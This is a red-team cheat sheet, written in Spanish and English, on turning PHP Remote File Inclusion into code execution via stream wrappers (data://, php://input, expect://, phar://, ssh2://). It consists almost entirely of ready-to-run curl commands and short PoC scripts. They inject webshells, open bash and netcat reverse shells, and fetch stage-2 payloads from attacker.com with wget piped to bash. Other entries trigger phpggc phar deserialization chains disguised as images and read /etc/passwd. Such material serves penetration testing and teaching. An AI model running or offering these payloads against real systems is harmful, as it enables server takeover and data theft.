---
aliases:
  - RFI PHP Wrappers
  - 'data://'
  - 'php://input'
  - 'expect://'
  - 'phar://'
tags:
  - vuln/rfi
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Remote File Inclusion (RFI)]]"
---
# RFI - PHP Wrappers y Schemes

---

## `data://` URI

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl --data-urlencode 'page=data://text/plain,<?php system($_GET["c"]); ?>' -G 'https://target/?c=id'` | Plain inline PHP payload | Standalone payload. |
| `curl 'https://target/?page=data://text/plain;base64,'$(echo '<?php system("id"); ?>' \| base64 -w0)` | Base64 inline payload | Avoid char filter. |
| `B64=$(echo '<?php system($_GET["c"]); ?>' \| base64 -w0) && curl "https://target/?page=data://text/plain;base64,$B64&c=id"` | Reusable B64 inline | Standard. |
| `curl --data-urlencode 'page=data://text/plain;base64,'$(echo '<?php passthru("bash -c \"bash -i >& /dev/tcp/'$IP'/4444 0>&1\""); ?>' \| base64 -w0) -G https://target/` | Reverse shell payload base64 | Direct shell. |
| `curl 'https://target/?page=data://text%2Fplain;base64,'$(python3 -c "import base64; print(base64.b64encode(b'<?php phpinfo(); ?>').decode())")` | Python b64 helper inline | DIY helper. |
| `curl 'https://target/?page=data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp+system%28%24_GET%5B%22c%22%5D%29%3B+%3F%3E&c=id'` | Fully URL-encoded data:// | Heavy filter. |
| `curl 'https://target/?page=data://text/plain,<%3Fphp system(\$_GET["c"])%3B %3F>&c=id'` | URL-encoded angle brackets | Encoded payload. |
| `curl 'https://target/?page=DATA://TEXT/PLAIN,<?php system($_GET[\"c\"]); ?>&c=id'` | Uppercase scheme variant | Case bypass. |
| `php -r "var_dump(ini_get('allow_url_include'));"` (target if accessible) | Verify allow_url_include enabled | Pre-attack check. |
| `curl 'https://target/?page=data://text/plain;charset=us-ascii;base64,'$B64` | Charset specifier variant | Edge parser. |
^rfi-wrapper-data

### PoC `data://` con base64

```bash
PAYLOAD='<?php system($_GET["c"]); ?>'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
curl "https://target/?page=data://text/plain;base64,${B64}&c=id"
```

---

## `php://input` (POST Body)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: text/plain" -d '<?php system($_GET["c"]); ?>' "https://target/?page=php://input&c=id"` | Standard php://input POST RCE | Body-based payload. |
| `curl -X POST -d '<?php phpinfo(); ?>' "https://target/?page=php://input"` | phpinfo() exfil config | Recon. |
| `curl -X POST -d '<?php echo shell_exec($_GET["c"]); ?>' "https://target/?page=php://input&c=cat /etc/passwd"` | shell_exec variant | Alt RCE. |
| `curl -X POST -d '<?php passthru("bash -c \"bash -i >& /dev/tcp/'$IP'/4444 0>&1\""); ?>' "https://target/?page=php://input"` | Reverse shell via body | RS combo. |
| `curl -X POST -H "Content-Type: text/plain" -d '<?php eval(base64_decode($_GET["b"])); ?>' "https://target/?page=php://input&b=$(echo 'system(\"id\");' \| base64)"` | Eval base64 body | Obfuscation. |
| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary '<?php system($_GET["c"]); ?>' "https://target/?page=php://input&c=id"` | Form-encoded body | Content-Type variant. |
| `curl -X POST --data-binary @shell.php "https://target/?page=php://input&c=id"` | Body from file | Big payload. |
| `curl -X POST -d '<?php passthru($_GET["c"]); ?>' "https://target/?page=php%3a%2f%2finput&c=id"` | URL-encoded php scheme | Encode bypass. |
| `python3 -c "import requests; print(requests.post('https://target/?page=php://input&c=id', data='<?php system(\$_GET[\"c\"]); ?>').text)"` | DIY Python POST | Programmatic. |
| `curl -X POST -d '<?php $f=fopen("/tmp/sh.php","w"); fwrite($f, file_get_contents("http://attacker.com/sh.php")); fclose($f); ?>' "https://target/?page=php://input"` | Body fetches remote shell + writes locally | Stage-2 payload. |
^rfi-wrapper-input

### PoC `php://input`

```bash
curl -X POST \
  -H "Content-Type: text/plain" \
  -d '<?php system($_GET["c"]); ?>' \
  "https://target/index.php?page=php://input&c=id"
```

---

## `expect://` (RCE Direct)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=expect://id'` | Direct shell command RCE | PHP expect ext. |
| `curl 'https://target/?page=expect://whoami'` | whoami via expect | Standard probe. |
| `curl --data-urlencode 'page=expect://bash -c "bash -i >& /dev/tcp/'$IP'/4444 0>&1"' -G https://target/` | Reverse shell via expect | RS direct. |
| `curl 'https://target/?page=expect://id%3Bwhoami%3Bhostname'` (URL-encoded `;`) | Multi-command chain | Pipe-style. |
| `curl 'https://target/?page=expect://cat%20%2Fetc%2Fpasswd'` | URL-encoded space | Encoded. |
| `curl 'https://target/?page=expect://wget%20-O%20-%20https%3A%2F%2Fattacker.com%2Fp.sh%20%7C%20bash'` | wget + pipe bash from attacker | Stager. |
| `curl 'https://target/?page=expect://nc%20-e%20%2Fbin%2Fbash%20'$IP'%204444'` (legacy netcat) | nc reverse shell legacy nc | Legacy nc. |
| `curl 'https://target/?page=expect%3A%2F%2Fid'` | URL-encoded scheme | Encode bypass. |
| `php -m \| grep -i expect` (target if accessible) | Verify expect ext loaded | Pre-attack. |
| `curl 'https://target/?page=expect://EXPECT://id'` (case variant) | Case-sensitive bypass | Edge. |
^rfi-wrapper-expect

---

## `phar://` Deserialization Trigger

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `phpggc -p phar Monolog/RCE1 system 'id' -o evil.phar && curl -F 'file=@evil.phar' https://target/upload && curl 'https://target/?page=phar:///var/www/uploads/evil.phar'` | Phar deserialization RCE chain | Phar combo. |
| `phpggc -p phar Guzzle/RCE1 system 'id' -o evil.phar && curl -F 'file=@evil.phar;filename=evil.jpg' https://target/upload && curl 'https://target/?page=phar:///var/www/uploads/evil.jpg'` | Phar disguised as JPG | Bypass extension filter. |
| `phpggc -p phar -j Symfony/RCE4 system 'id' -o evil.phar` (JPG polyglot) | Polyglot Phar+JPG | Polyglot stealth. |
| `curl --upload-file evil.phar 'https://target/upload' && curl 'https://target/?page=phar:///tmp/uploaded.phar/test'` | PUT upload + phar trigger | PUT variant. |
| `phpggc -l` | List phpggc available gadget chains | Gadget reference. |
| `phpggc Laravel/RCE1 system 'id' -p phar -o evil.phar` (Laravel chain) | Laravel Phar gadget | Laravel chain. |
| `phpggc TYPO3/RCE1 system 'id' -p phar -o evil.phar` (TYPO3 chain) | TYPO3 Phar gadget | TYPO3 chain. |
| `curl 'https://target/?page=phar://./uploads/evil.jpg/x'` (relative path) | Relative phar path | Relative trigger. |
| `php --rf TarArchive::__destruct` (target if accessible) | Verify gadget class available | Pre-attack reflection. |
| `curl 'https://target/?page=phar:///proc/self/fd/0'` (combine /proc) | Phar from /proc FD | Edge /proc. |
| `phpggc -p phar+gzip Monolog/RCE1 system 'id' -o evil.phar` | Phar gzip compress | Compress variant. |
| `git clone https://github.com/ambionics/phpggc && cd phpggc && ./phpggc -l` | Install phpggc | Setup. |
^rfi-wrapper-phar

### Phar workflow

```bash
# 1. Generate phar payload
phpggc -p phar Monolog/RCE1 system "id" -o evil.phar

# 2. Upload as image (bypass ext filter)
curl -X POST -F "file=@evil.phar;filename=evil.jpg" \
  "https://target/upload"

# 3. Trigger via phar:// stream wrapper
curl -s "https://target/index.php?page=phar:///var/www/uploads/evil.jpg"
```

---

## `ssh2://` y Otros

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=ssh2.shell://user:pass@attacker.com:22/sh.cmd'` | ssh2.shell:// scheme | PHP ssh2 ext. |
| `curl 'https://target/?page=ssh2.exec://user:pass@attacker.com:22/id'` | ssh2.exec:// direct command | Direct RCE. |
| `curl 'https://target/?page=ssh2.tunnel://user:pass@attacker.com:22/127.0.0.1:80/'` | ssh2.tunnel:// pivot tunnel | SSH pivot. |
| `curl 'https://target/?page=ssh2.sftp://user:pass@attacker.com/etc/passwd'` | SFTP scheme network LFI | Network LFI. |
| `curl 'https://target/?page=compress.zlib://uploads/x.gz'` | gzip stream | Compressed. |
| `curl 'https://target/?page=compress.bzip2://uploads/x.bz2'` | bzip2 stream | Compressed. |
| `curl 'https://target/?page=zip://uploads/p.zip%23inside.php'` | Read inside ZIP path | ZIP path traversal. |
| `curl 'https://target/?page=glob:///var/www/*.php'` | Glob wildcard list files | List files. |
| `curl 'https://target/?page=ogg://uploads/file.ogg'` | Ogg audio scheme | Edge. |
| `curl 'https://target/?page=rar://uploads/x.rar%23inside'` | RAR archive (PHP RAR ext) | Edge. |
| `php -r "print_r(stream_get_wrappers());"` (target if accessible) | Enum registered stream wrappers | Pre-attack. |
| `curl --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' -G https://target/ \| base64 -d` | php:// filter source disclosure | Source disclosure. |
| `curl 'https://target/?page=php://filter/convert.iconv.UTF8.CSISO2022KR\|convert.base64-decode\|convert.iconv.UTF8.CSISO2022KR/resource=data://,<?php system(\"id\"); ?>'` | Filter chain RCE without `allow_url_include` | Filter chain RCE. |
^rfi-wrapper-ssh2

### Stream wrapper enum

```php
<?php print_r(stream_get_wrappers()); ?>
```

Typical output: `https, ftps, http, ftp, zip, compress.zlib, compress.bzip2, php, file, glob, data, phar, ssh2.shell, ssh2.exec, ...`

---
